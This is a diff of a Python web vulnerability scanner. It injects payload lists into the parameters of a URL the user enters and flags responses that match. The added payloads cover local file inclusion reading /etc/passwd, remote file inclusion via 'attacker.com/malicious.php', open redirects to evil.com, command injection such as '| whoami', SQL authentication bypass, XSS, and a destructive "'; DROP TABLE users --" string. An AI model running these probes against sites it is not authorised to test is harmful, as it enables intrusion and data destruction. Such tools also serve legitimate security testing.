@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 import re
-import time
 import urllib.request
 import urllib.parse
+import time
 from urllib.error import HTTPError, URLError
 
-# Colors for Output (ANSI Colors)
+# Colors for Output
 class Colors:
     def __init__(self):
         self.green = "\033[92m"
@@ -17,18 +17,17 @@ class Colors:
 
 ga = Colors()
 
+# Utility to Print Styled Messages
+def print_message(message, color):
+    print(f"{color}{message}{ga.end}")
+
 # HTTP Headers Handling
 class HTTPHeader:
     HOST = "Host"
     SERVER = "Server"
 
-# Utility to Print Styled Messages
-def print_message(message, color):
-    print(f"{color}{message}{ga.end}")
-
 # Function to Read and Display HTTP Headers
 def headers_reader(url):
-    """Fingerprint backend technologies by examining HTTP headers."""
     print_message("\n[!] Fingerprinting the backend Technologies.", ga.bold)
     try:
         response = urllib.request.urlopen(url)
@@ -56,79 +55,94 @@ def headers_reader(url):
         print_message(f"[!] Error: {str(e)}", ga.red)
 
 # Main Function to Test Payloads
-def test_payloads(url, payloads, regex_pattern):
-    """Test a list of payloads against the given URL and check for vulnerabilities."""
+def test_payloads(url, payloads, regex_pattern, vuln_type):
+    print_message(f"\n[!] Scanning for {vuln_type} Vulnerabilities", ga.bold)
     vulnerabilities = 0
-    try:
-        for params in url.split("?")[1].split("&"):
-            for payload in payloads:
-                modified_url = url.replace(params, params + str(payload).strip())
-                try:
-                    response = urllib.request.urlopen(modified_url)
-                    html = response.read().decode("utf-8")
-                    if re.search(regex_pattern, html):
-                        vulnerabilities += 1
-                        print_message("\n[*] Payload Found!", ga.red)
-                        print_message(f"[*] Payload: {payload}", ga.red)
-                        print_message(f"[!] Exploitation URL: {modified_url}", ga.blue)
-                except HTTPError as e:
-                    print_message(f"[!] HTTP Error while testing payload {payload}: {e.code}", ga.yellow)
-                except Exception as e:
-                    print_message(f"[!] Error testing payload {payload}: {str(e)}", ga.yellow)
+    for params in url.split("?")[1].split("&"):
+        for payload in payloads:
+            modified_url = url.replace(params, params + str(payload).strip())
+            try:
+                response = urllib.request.urlopen(modified_url)
+                html = response.read().decode("utf-8")
+                if re.search(regex_pattern, html):
+                    vulnerabilities += 1
+                    print_message("\n[*] Vulnerability Found!", ga.red)
+                    print_message(f"[*] Payload: {payload}", ga.red)
+                    print_message(f"[!] Exploitation URL: {modified_url}", ga.blue)
+            except HTTPError as e:
+                print_message(f"[!] HTTP Error while testing payload {payload}: {e.code}", ga.yellow)
+            except Exception as e:
+                print_message(f"[!] Error testing payload {payload}: {str(e)}", ga.yellow)
 
-        if vulnerabilities == 0:
-            print_message("[!] No vulnerabilities found!", ga.green)
-        else:
-            print_message(f"[!] Found {vulnerabilities} vulnerabilities!", ga.blue)
+    if vulnerabilities == 0:
+        print_message(f"[!] No {vuln_type} vulnerabilities found!", ga.green)
+    else:
+        print_message(f"[!] Found {vulnerabilities} {vuln_type} vulnerabilities!", ga.blue)
 
-    except Exception as e:
-        print_message(f"[!] Error during testing: {str(e)}", ga.red)
+# Vulnerability Functions
 
-# Remote Code Execution Detection
-def detect_rce(url):
-    """Detect Remote Code/Command Execution vulnerabilities."""
-    headers_reader(url)
-    print_message("\n[!] Scanning for Remote Code/Command Execution", ga.bold)
-    payloads = [
-        ';${@print(md5(dadevil))}',
-        ';uname;',
-        '&&dir',
-        '&&type C:\\boot.ini',
-        ';phpinfo();'
-    ]
-    regex_pattern = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\\(\\)|SERVER_ADDR|Volume.+Serial|\\[boot", re.I)
-    test_payloads(url, payloads, regex_pattern)
+def detect_lfi(url):
+    print_message("\n[!] Scanning for Local File Inclusion (LFI)", ga.bold)
+    payloads = ["../../../../../../../../etc/passwd", "../../windows/win.ini", "/etc/passwd"]
+    regex_pattern = re.compile("root:|\\[extensions\\]|\\[fonts\\]", re.I)
+    test_payloads(url, payloads, regex_pattern, "Local File Inclusion")
 
-# Cross-Site Scripting Detection
+def detect_rfi(url):
+    print_message("\n[!] Scanning for Remote File Inclusion (RFI)", ga.bold)
+    payloads = ["http://example.com/shell.txt", "http://attacker.com/malicious.php"]
+    regex_pattern = re.compile("<\\?php|malicious|shell", re.I)
+    test_payloads(url, payloads, regex_pattern, "Remote File Inclusion")
+
+def detect_open_redirect(url):
+    print_message("\n[!] Scanning for Open Redirect", ga.bold)
+    payloads = ["http://evil.com", "//evil.com", "/\\evil.com"]
+    regex_pattern = re.compile("evil\\.com", re.I)
+    test_payloads(url, payloads, regex_pattern, "Open Redirect")
+
+def detect_directory_traversal(url):
+    print_message("\n[!] Scanning for Directory Traversal", ga.bold)
+    payloads = ["../../../../etc/passwd", "../../../../boot.ini", "../" * 10 + "etc/passwd"]
+    regex_pattern = re.compile("root:|\\[boot\\]", re.I)
+    test_payloads(url, payloads, regex_pattern, "Directory Traversal")
+
+def detect_command_injection(url):
+    print_message("\n[!] Scanning for Command Injection", ga.bold)
+    payloads = ["; uname -a", "&& dir", "| whoami"]
+    regex_pattern = re.compile("Linux|Windows|root|Administrator", re.I)
+    test_payloads(url, payloads, regex_pattern, "Command Injection")
+
+def detect_auth_bypass(url):
+    print_message("\n[!] Scanning for Authentication Bypass", ga.bold)
+    payloads = ["' OR '1'='1", "' OR 'x'='x", "\" OR \"a\"=\"a"]
+    regex_pattern = re.compile("Welcome|Dashboard|Logged in", re.I)
+    test_payloads(url, payloads, regex_pattern, "Authentication Bypass")
+
 def detect_xss(url):
-    """Detect Cross-Site Scripting vulnerabilities."""
-    print_message("\n[!] Scanning for XSS", ga.bold)
-    payloads = [
-        "%27%3EJUNAI0%3Csvg%2Fonload%3Dconfirm%28%2FJUNAI%2F%29%3Eweb",
-        "%78%22%78%3e%78"
-    ]
-    regex_pattern = re.compile("JUNAI<svg|x>x", re.I)
-    test_payloads(url, payloads, regex_pattern)
+    print_message("\n[!] Scanning for Cross-Site Scripting (XSS)", ga.bold)
+    payloads = ["<script>alert('XSS')</script>", "><img src=x onerror=alert(1)>"]
+    regex_pattern = re.compile("<script>alert|alert\\(1\\)", re.I)
+    test_payloads(url, payloads, regex_pattern, "XSS")
 
-# SQL Injection Detection
 def detect_sql_injection(url):
-    """Detect SQL Injection vulnerabilities."""
-    print_message("\n[!] Scanning for Error-Based SQL Injection", ga.bold)
-    payloads = [
-        "3'", 
-        "3%5c", 
-        "3%27%22%28%29", 
-        "3'><"
-    ]
-    regex_pattern = re.compile("Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+quote|SQL.+Server", re.I)
-    test_payloads(url, payloads, regex_pattern)
+    print_message("\n[!] Scanning for SQL Injection", ga.bold)
+    payloads = ["1' OR '1'='1", "' UNION SELECT 1,2,3 --", "'; DROP TABLE users --"]
+    regex_pattern = re.compile("SQL syntax|mysql_fetch", re.I)
+    test_payloads(url, payloads, regex_pattern, "SQL Injection")
 
 # Entry Point
 if __name__ == "__main__":
-    print_message("\n[+] Starting Vulnerability Scanner...", ga.bold)
-    url = input(ga.green + "[!] Enter the URL to scan: " + ga.end)
+    print_message("\n[+] Starting Comprehensive Vulnerability Scanner...", ga.bold)
+    target_url = input(ga.green + "[!] Enter the URL to scan (e.g., http://example.com/page?id=1): " + ga.end)
+    if "?" not in target_url:
+        print_message("[!] Invalid URL. Ensure the URL includes parameters (e.g., ?id=value).", ga.red)
+        exit()
 
-    # Perform different scans
-    detect_rce(url)
-    detect_xss(url)
-    detect_sql_injection(url)
+    headers_reader(target_url)
+    detect_lfi(target_url)
+    detect_rfi(target_url)
+    detect_open_redirect(target_url)
+    detect_directory_traversal(target_url)
+    detect_command_injection(target_url)
+    detect_auth_bypass(target_url)
+    detect_xss(target_url)
+    detect_sql_injection(target_url)
